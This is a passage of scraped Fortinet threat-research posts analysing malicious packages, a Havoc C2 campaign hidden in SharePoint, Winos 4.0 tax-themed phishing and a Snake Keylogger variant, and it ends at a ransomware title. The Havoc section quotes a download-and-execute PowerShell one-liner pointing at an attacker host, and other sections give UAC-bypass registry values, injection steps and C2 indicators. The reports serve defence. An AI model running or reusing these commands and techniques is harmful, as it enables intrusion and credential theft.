(seller-admin-common_6.5.8, seller-rn-mng-lib_6.5.8. ) is designed to secretly collect sensitive information from a victim’s machine and send it to an external server via a Discord webhook. Upon execution, the script retrieves the internal IP address of the victim’s machine and fetches the external IP address by making an HTTPS request to an online API. It also gathers system details, such as the hostname, username, DNS servers, home directory, and application information. This collected data is then bundled into a JSON object and sent to the attacker’s server, where it can be accessed for further malicious purposes. The combination of internal and external IP addresses, DNS settings, and user details makes the attack highly invasive, enabling attackers to track the victim’s machine and potentially exploit the information for further attacks. Using a Discord webhook adds a layer of stealth, allowing the attacker to collect the stolen data without raising suspicion, making this type of data harvesting ideal for gathering intelligence or executing more targeted cyberattacks. A recently identified malicious JavaScript code found in the package xeno.dll_1.0.2 utilizes obfuscation techniques to disguise its true intentions. Upon installation, it logs keystrokes to capture private information such as passwords and credit card details, which are then encrypted and sent to a remote server controlled by the attacker. Additionally, the script installs a backdoor that provides remote access with elevated privileges, giving the attacker full control of the system. The backdoor also collects system-specific data, such as the operating system version, installed applications, and network configuration, and sends it to the attacker’s server for future exploitation. Disguised as a legitimate service, the attacker’s server makes the malicious activity harder to detect. This stealthy combination of keylogging and remote access allows the attacker to steal sensitive data and conduct further attacks, posing a significant threat to the victim's privacy and system integrity. The data from FortiGuard Labs’ analysis reveals a diverse array of malicious packages, showcasing the wide range of tactics used by cybercriminals. From simple low-file-count packages to complex, multi-layered attacks that involve combining files, network code, and process execution, attackers are leveraging increasingly sophisticated methods to breach systems. As cybersecurity threats evolve, it’s crucial for organizations and individuals to stay informed about the latest threats. Proactive defense measures such as regular system updates, advanced threat detection, and user education on identifying suspicious activity are essential in mitigating these growing risks. Stay vigilant and protect your systems from these emerging threats. FortiGuard AntiVirusdetects the malicious files identified in this report as: AffineQuant-99.6/main.py : Python/Agent.EBC2!traffineQuant-99.6: Python/Agent.EBC2!tramzn-aws-glue-ml-libs-python-6.1.5/setup.py: Python/Agent.D31D!tramzn-aws-glue-ml-libs-python-6.1.5:Python/Agent.D31D!tramzn-awsglue-6.1.4/setup.py: Python/Agent.8960!trAmzn-awsglue-6.1.4: Python/Agent.8960!trseller-admin-common_6.5.8/index.js: JS/Agent.409D!trSeller-admin-common_6.5.8: JS/Agent.409D!trseller-rn-mng-lib_6.5.8/index.js: JS/Agent.409D!trSeller-rn-mng-lib_6.5.8: JS/Agent.409D!trxeno.dll_1.0.2/index.js: JS/Agent.B3EF!trXeno.dll_1.0.2: JS/Agent.B3EF!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name Sha256 Detection affineQuant-99.6/main.py a7ba9a1eef84ae8dad8ed328c41fe4346df402a003ff7cef5e7cbd592c29f4de Python/Agent.EBC2!tr affineQuant-99.6 8fe3eee65782c61111354a0a2a58da04901c7b416d3b7634aa605e1939dde531 Python/Agent.EBC2!tr amzn-aws-glue-ml-libs-python-6.1.5/setup.py 2420fa98a183da4153e4de00e401efa19c62fe9ed631d980315b0b719221aec4 Python/Agent.D31D!tr amzn-aws-glue-ml-libs-python-6.1.5 05e9226714f29fbe526820d35c8011f86297444ec581d16d60b38bb55b20fa91 Python/Agent.D31D!tr amzn-awsglue-6.1.4/setup.py ba0ac1985fb931110899402ce44f11c5d75161cb69ff3d0e9357000ef631a2e1 Python/Agent.8960!tr amzn-awsglue-6.1.4 351bd6e977884f050bdb348239cfd20e0cc9b9a7a6aa3b3aa21e3bed0b072afe Python/Agent.8960!tr seller-admin-common_6.5.8/index.js 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-admin-common_6.5.8 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-rn-mng-lib_6.5.8/index.js 920da0917dbf7ead5531406b324de83656c90a39176f5377c123fe36d257668b JS/Agent.409D!tr seller-rn-mng-lib_6.5.8 673db52c28aac71f8cf80ee1718b8ea98e1f8e0b3f1293da15fd26c4e6343927 JS/Agent.409D!tr xeno.dll_1.0.2/index.js 6a68848e118ec280d01a1dc989e8d67ca10b3f14aab98eb87a23b340c863fdcf JS/Agent.B3EF!tr xeno.dll_1.0.2 973a87cc0baa17c53a17467e188d82241458f7ff1e70e920014eaf2bacbe3a07 JS/Agent.B3EF!tr malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortinet-identifies-malicious-packages-in-the-wild-insights-and-trends"
  },
  {
    "title": "Havoc: SharePoint with Microsoft Graph API turns into FUD C2",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Havoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain. The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately. The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code. Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script. powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\" The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4. Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5. Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader. We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6. KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7. Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets. In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services. The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects. The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API. It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs. Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10. The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose. The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server. All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function. The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin. It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased. Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker. In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program. The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks. In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands. In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Agent.A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent.DF60!trW64/Havoc.L!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. FortiGuard Labs provides theBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. hao771[.]sharepoint.com 51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3 C2 server FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2"
  },
  {
    "title": "Winos 4.0 Spreads via Impersonation of Official Email to Target Users in Taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. According  to a report released in November 2024, Winos4.0 was distributed through gaming-related applications, however, it spread via an email masquerading as from Taiwan's National Taxation Bureau in the campaign in January 2025. The sender claimed that the malicious file attached was a list of enterprises scheduled for tax inspection and asked the receiver to forward the information to their company's treasurer. The attachment also masquerades as an official document from the Ministry of Finance. It asks the victim to download the attached list of enterprises slated for tax inspection. However, the list is a ZIP file containing malicious DLL for the next attack stage. The files in the ZIP file are executed in the following sequence: 20250109.exe, ApowerREC.exe, and lastbld2Base.dll. 20250109.exe is a launcher originally used to execute the actual APowerREC.exe in ./app/ProgramFiles. The attacker created the same folder structure in the ZIP file and used a loader to replace ApowerREC.exe. The fake ApowerREC.exe does nothing but call a function imported from lastbld2Base.dll. When an executable file is run, it loads all necessary DLL files and executes their entry functions. As a result, the DLLMain function of lastbld2Base.dll, where the malicious code is located, is loaded when the fake ApowerREC.exe is executed. Lastbld2Base.dll decrypts its data to get the shellcode for the next stage. At the bottom of the shellcode are configurations, including the IP address of the C2 server, the name of the base registry key for the next stage, and flags for features for the current stage. The optional features include permission evaluation, hiding the window of the current process, and anti-sandbox functions. If higher permission is needed in this attack, it tests the current permissions by opening the registry key HKEY_LOCAL_MACHINE\\SOFTWARE and executing ApowerREC.exe as an administrator. For the anti-sandbox function, it takes two screenshots within a two-second interval. If there are more than 20,000 different pixels in the second screenshot, which means a user is active on the computer, it performs its remaining tasks. Otherwise, it continues taking screenshot and compares it with the first one for at most one hour. After the optional features are run, it downloads the encrypted shellcode data and the Winos4.0 module from its C2 server. The encrypted data is written to HKEY_CURRENT_USER\\B118D5E900008F7A, the base registry for configurations in the next stage, with a value name of “0”. After this, it decrypts the data to get the shellcode, followed by partially decrypted data of the module. The new shellcode decrypts the data with another algorithm to get a DLL file and parses its export table to get the address of the only export function. In this attack, the module from the C2 server creates eight threads to perform different tasks: MainThread, CloseWindow, Screenshot, Keylog, Clipboard, USB, ReadReg, and Anti-AV. Mutex: Global\\MainThreadB118D5E900008F7AThe MainThread creates the remaining seven threads. In addition, it performs the following actions: API Constant Description SystemParametersInfoW SPI_SETSCREENSAVEACTIVE Deactivates the screen saver SetThreadExecutionState ES_CONTINUOUS ES_AWAYMODE_REQUIRED ES_SYSTEM_REQUIRED Enables the Away mode so the program keeps working while the computer appears to be sleeping PowerSetRequest PowerRequestDisplayRequired The display remains on even if the computer is idle Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: ConsentPromptBehaviorAdmin Value: 0 Description: Allows the Consent Admin to perform an operation that requires elevation without consent or credentials. Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: PromptOnSecureDesktop Value: 0 Description: Disables secure desktop prompting Mutex: Global\\ClosewWindowIt calls theEnumWindowsfunction to enumerate all visible windows to find the windows of kxecenter(Kingsoft Security) and HipsTray(Huorong). It checks the window's width to ensure it is the security prompt window. When the target window is found, it clicks the \"Permit\" button on the prompt window. Mutex: Global\\ScreenShotB118D5E900008F7AIt takes screenshots of applications that contain the keywords stored in the valuepicshotdataof HKEY_CURRENT_USER\\B118D5E900008F7A, and the screenshots are saved to C:\\ProgramData\\B118D5E900008F7A\\{keyword}\\{Date}.Ifpicshotdatadoesn’t exist, this thread will not be executed. Mutex: Global\\KeylogB118D5E900008F7AIt keeps checking the value of theKEYLOGof HKEY_CURRENT_USER\\B118D5E900008F7A. If the value is 1, it creates a mutex C:\\ProgramData\\B118D5E900008F7A\\Regedit.log and starts recording the user's keystrokes and the contents in the clipboard. The data is written to C:\\ProgramData\\B118D5E900008F7A\\Regedit.log. Mutex: Global\\ClipboardB118D5E900008F7AIt replaces keywords in the clipboard with the text stored in the registry value clipboarddata of HKEY_CURRENT_USER\\B118D5E900008F7A. The value contains three properties: Mode, Expression, and Replace. When Mode is “Modify,” Expression specifies the pattern to look for in the clipboard, and Replace specifies the replacement.If clipboarddata doesn’t exist, this thread will not be executed. Mutex: Global\\UsbB118D5E900008F7AIt collects the names of connected USB devices every three seconds except for those that include the following keywords: mouse, keyboard, wlan, lenovo, and sanmsung (misspelling of samsung). If a new USB device is inserted or removed, it updates the device list with a Chinese annotation that means “USB device inserted” or “USB device removed.” It reads the value B118D5E900008F7A0 from HKCU\\Console to get the shellcode and execute it every five seconds. First, it bypasses the UAC prompt by modifying the registry key values mentioned in MainThread. Then, it callsGetTcpTable2to obtain active TCP connections. If a TCP connection is owned by 360Safe, Kingsoft, or Huorong processes, it disables it. There are other attack chains used in this campaign. The查看10.exe(view10) is compiled from a Python script by Nuitka, and it loads Python311.dll, which is the malicious file. The shellcode from Python311.dll decrypts its data to get a DLL file that writes another shellcode to the registry value ofhrqnmlb{XXXXXX}of the HKCU\\Console\\, and the shellcode is also saved as bb.jpg in C:\\Users\\Public\\Download. The shellcode plays the same role as the shellcode from lastbld2Base.dll we mentioned above. However, its marker string is used by a version preceding the one described in areportreleased in November 2024. Another point worth mentioning is that the DLL contains multiple snippets of shellcode that are identical to Figure 13 except for the C2 domain. While only  9010[.]360sdgg[.]com is used in this attack, other domains have been observed in different campaigns. The 上线模块.dll(online module) is used to take screenshots of WeChat and the online bank, and the akagi.exe is a module of UACMe. Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it’s also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW32/Agent.7BBA!trW64/UACMe.O!trW64/ValleyRat.A!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 43[.]137[.]42[.]254206[.]238[.]221[.]60206[.]238[.]221[.]240124[.]156[.]100[.]172206[.]238[.]221[.]244 1234[.]360sdgg[.]com9001[.]360sdgg[.]com9002[.]360sdgg[.]com9003[.]360sdgg[.]com9005[.]360sdgg[.]com9006[.]360sdgg[.]com9007[.]360sdgg[.]com9009[.]360sdgg[.]com9010[.]360sdgg[.]comffggssa-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comfuued5-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0107-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comrgghrt1140120-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comhei-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comchakan202501-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comwrwyrdujtw114117-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comfdsjg114-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comsjujfde-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comhtrfe4-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0611-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfw[.]vip 36afc6d5dfb0257b3b053373e91c9a0a726c7d269211bc937704349a6b4be9b90e3c9af7066ec72406eac25cca0b312894f02d6d08245a3ccef5c029bc297bd267395af91263f71cd600961a1fd33ddc222958e83094afdde916190a0dd5d79cf4d3477a19ff468d234a5e39652157b2181c8b51c754b900bcfa13339f577e7cc9a8db23d089aa71466b4bde51a51a8cfdcc28e8df33b4c63ce867bd381e5fe5 e2b75baeb7ed21fb8f27984f941286770d1c3c0b60fce8d7fa5b167bd24ba6dcdffbeefc632b20d2ef867553684e9971ab76e1223e743604a5275713423b616820c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f483166c33715a14fdc917b5b09b6e1b5dad07bb769493eafbf7ca1023830b4059e00375a4d75c35724140149c9c5056c1bcbd328bbe1e5d1d1ef34205ed5442d2b348fed394a3653b7c6fcc1b277eda6e18eb0983a7e024be5b51e5188b3cfb9512e8a067d848f099e6d1e465f9761a5b85392d550303bfa75fac920d444fd980c949c55757075259fa4be6941dd273c4a4a2fcc29e6ba427dec124b25b299b3505fe64a876e6cb3cf3122febc84a00ec3e0740c054cff955164971c470e1b5e5f1bbd4ac82de8dda9796579cd8ea0f84b43c7a980cdb0e9cdb8abe8981a2d215ed2f(20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316 Corrupt) 268c72f5482374660a132d1b91cac0c04b4724a214db4f052eb421e36c2829210a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b79c64d2e77acdbcdbd35cbb29497941335d7e3ab6ebb474064f095e745f0d6437f22305679e46e1fd5043beb136108197c0921643ce0d680f990a3018ade485b594d907855d35ee7689a568e4ac43e4e0ed90de047d91b0253ef79da71ecbc081f3b041eee1ece8cf6aa5c742aeb8c0ac2266cccecca7888772509227c4f8669514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef6117a5b26f6dd7b8e0d648e9804ec932603b7d7a5f76c7a8c537ab0c2be54f51fa98b1b9a789136ca3abe25938204845c351aaf0c97c0708ade8d4d8ba4ded95ba71ad1f2eec961bc7a35abeac486f843b7caece0929b13f1dab47fbdc0406ac4e34c1ea827713f1eb57cc0e8e9d171d4e21d116f846b174bc05114eef5674c96531a342426d59e7fdc4abfb74c2225f68382172e03b0f8d496a57ae647411f0fbd2ce73cbfab0beb3663c0151ba7c310e4dbf69f295d8a18114435506483d774ac0a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef61176ac08358f230bca3e8b8448b3c177094aeac25402b929f5f73869ec77173a44 advanced malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/winos-spreads-via-impersonation-of-official-email-to-target-users-in-taiwan"
  },
  {
    "title": "FortiSandbox 5.0 Detects Evolving Snake Keylogger Variant",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Silently records keystrokes to collect credentials, data, and other sensitive informationSeverity level:High FortiGuard Labs leveraged the advanced capabilities of FortiSandbox v5.0 (FSAv5) to detect a new variant of the Snake Keylogger (also known as 404 Keylogger). This malware, identified as AutoIt/Injector.GTY!tr, has been responsible for over 280 million blocked infection attempts, highlighting its extensive reach across regions. The majority of these detections have been concentrated in China, Turkey, Indonesia, Taiwan, and Spain, suggesting a significant impact in these areas. This high volume of detections underscores the malware’s ongoing global threat and its potential to affect organizations and users worldwide. The recent surge in activity also highlights the continuous evolution of keylogger malware and the need for advanced detection mechanisms. Typically delivered through phishing emails containing malicious attachments or links, Snake Keylogger is designed to steal sensitive information from popular web browsers like Chrome, Edge, and Firefox by logging keystrokes, capturing credentials, and monitoring the clipboard. In addition to data theft, Snake Keylogger exfiltrates the stolen information to its command-and-control (C2) server using SMTP (email) and Telegram bots, allowing attackers to access stolen credentials and other sensitive data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FSAv5 features a new AI engine, PAIX, an advanced machine learning-powered system designed to detect and analyze previously unknown threats in real-time. By utilizing a blend of behavioral analysis and file attributes, PAIX can identify suspicious activity and potential malware before they affect your environment. Integrated into FortiSandbox devices, the engine is regularly updated with the latest AI models to ensure optimal protection. In the following sections, we will explore how FSAv5 detected this malware, the behavioral indicators it leveraged for identification, and Snake Keylogger's technique to evade detection and analysis. We will also examine how FortiSandbox’s advanced heuristics and machine learning models contribute to identifying and mitigating emerging keylogger threats. The AI engine in FSAv5 provides detailed static analysis, uncovering obfuscated strings and embedded APIs responsible for keylogging and credential harvesting. Additionally, FSAv5’s dynamic analysis capabilities captured the keylogger’s runtime behavior, including processes launched by the malware and the establishment of network connections to its command-and-control (C2) server. These insights revealed Snake Keylogger’s ability to exfiltrate stolen data while avoiding traditional detection mechanisms, further emphasizing the importance of FSAv5’s comprehensive malware analysis. Additionally, suspicious indicators triggered during the analysis were recorded and categorized (Figure 3). This comprehensive documentation provides further context and aids in identifying potential malicious activities. With the enhancements in FSAv5, these indicators not only document observed behaviors but also correlate them with specific MITRE ATT&CK techniques. This correlation provides a deeper understanding of the tactics employed by the malware. The integrated AI in FSAv5 performs static analysis, enabling it to detect malware without executing its code. As shown in Figure 4, the AI engine can efficiently identify potential threats by analyzing the malware’s code structure, embedded signatures, and other static properties. This new variant of Snake Keylogger employs AutoIt, a scripting language commonly used for automating tasks in the Windows environment, to deliver and execute its malicious payload. AutoIt is often leveraged by threat actors due to its versatility and ability to generate standalone executables that can bypass traditional antivirus solutions. In this variant of Snake Keylogger, the executable is an AutoIt-compiled binary, which adds an additional layer of obfuscation to hinder detection and analysis. The use of AutoIt not only complicates static analysis by embedding the payload within the compiled script but also enables dynamic behavior that mimics benign automation tools. Figure 5 shows the AutoIt encrypted script used for compiling the binary. The AI in FSAv5 identified these embedded malicious strings and API calls. Upon execution, Snake Keylogger drops a copy of itself to the %Local_AppData%\\supergroup folder under “ageless.exe,” setting its attributes to hidden. Once established in this directory, it drops another file into the %Startup% folder, named ageless.vbs. This script contains a command that utilizes WScript.Shell() to call the Run () method, executing ageless.exe and ensuring the malware runs automatically upon system startup. The ageless.vbs script, as captured and backed up by FSAv5 for analysis, is shown in Figure 6. Snake Keylogger copies the ageless.vbs file into the Startup folder as a persistence mechanism, ensuring that it automatically executes each time the infected system reboots. This method is commonly used because the Windows Startup folder allows scripts, executables, or shortcuts to run without required administrative privileges. By leveraging this technique, Snake Keylogger can maintain access to the compromised system and re-establish a foothold even if the malicious process is terminated. Figure 7 illustrates an indicator of Snake Keylogger employing this persistence method. Additionally, Figure 8 shows a screenshot of the ageless.vbs file placed in the Startup folder. After the execution of ageless.exe, the malware injects its malicious payload into a legitimate .NET process. The observed sample targets the RegSvcs.exe process using a technique known as process hollowing, which allows the malware to execute its code within a trusted process to evade detection. Process hollowing works by first spawning RegSvcs.exe in a suspended state, preventing it from executing its legitimate code. Next, the malware deallocates the original code section and allocates new memory space within the hollowed process. Finally, it writes its malicious payload into the newly allocated space. When the process resumes, RegSvcs.exe executes the injected malicious code. This method allows the malware to conceal its presence, making it significantly harder for traditional security tools to detect and remove. By embedding itself within a trusted process, Snake Keylogger can operate undetected and continue its malicious activities. Figure 9 shows an indicator with its corresponding risk score, highlighting the severity of the threat. Another FSAv5 indicator that provides valuable insights into the malware’s capabilities is its ability to detect when the folder storing browser-related login credentials and other sensitive data is accessed, as shown in Figure 10. This indicator offers critical clues about the malware’s intent and behavior, highlighting its potential to compromise user data. Snake Keylogger leverages various techniques to exfiltrate stolen credentials and gather additional information about the victim. One such method involves using websites like hxxp://checkip[.]dyndns[.]org to retrieve the victim’s geolocation, further enhancing its reconnaissance capabilities. Additionally, Snake Keylogger uploads stolen credentials through several channels, including SMTP and Telegram bots, using HTTP Post requests to securely transmit the data to its command-and-control server, as shown in Figure 11. The FortiSandbox research team analyzed the malware through reverse engineering and dynamic sandbox analysis, revealing the full scope of its malicious capabilities. Figures 12 and 13 show that the malware employs specialized modules to steal sensitive data from browser autofill systems, including credit card details. To capture keystrokes, it leverages the SetWindowsHookEx API with the first parameter set to WH_KEYBOARD_LL (flag 13), a low-level keyboard hook that monitors keystrokes (see Figure 14). This technique allows the malware to log sensitive input such as banking credentials. FortiSandbox plays a pivotal role in detecting and analyzing advanced malware threats like Snake Keylogger. Leveraging its innovative static and dynamic analysis capabilities and the power of its PAIX engine, FortiSandbox ensures the comprehensive detection of sophisticated threats. Capturing detailed indicators of compromise also empowers users to proactively safeguard their systems against evolving malware attacks, providing valuable insights for effective mitigation. TheFortiSandboxidentifies the malware mentioned in this report and any variations of it. It does not rely on updates fromFortiGuard Antivirus; instead, it utilizes the PAIX engine’s Machine Learning technology to detect previously unknown threats. FortiGuard Antivirus specifically detects the malware described in this report as AutoIt/Injector.GTY!tr. This service is integrated into FortiGate, FortiMail, FortiClient, and FortiEDR solutions, providing protection to customers using these products with up-to-date defenses. Additionally, the FortiGuard Web Filtering Service detects and blocks the command-and-control (C2) server. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals (FCF)in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization. Please contact ourGlobal FortiGuard Incident Response Team. Command-and-Control (C2) Serverhttp://51[.]38[.]247[.]67:8081/_send_php?L [Original file]f8410bcd14256d6d355d7076a78c074f [ageless.exe]f8410bcd14256d6d355d7076a78c074f [ageless.vbs]77f8db41b320c0ba463c1b9b259cfd1b keylogger FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-evolving-snake-keylogger-variant"
  },
  {
    "title": "Ransomware Roundup – Lynx",
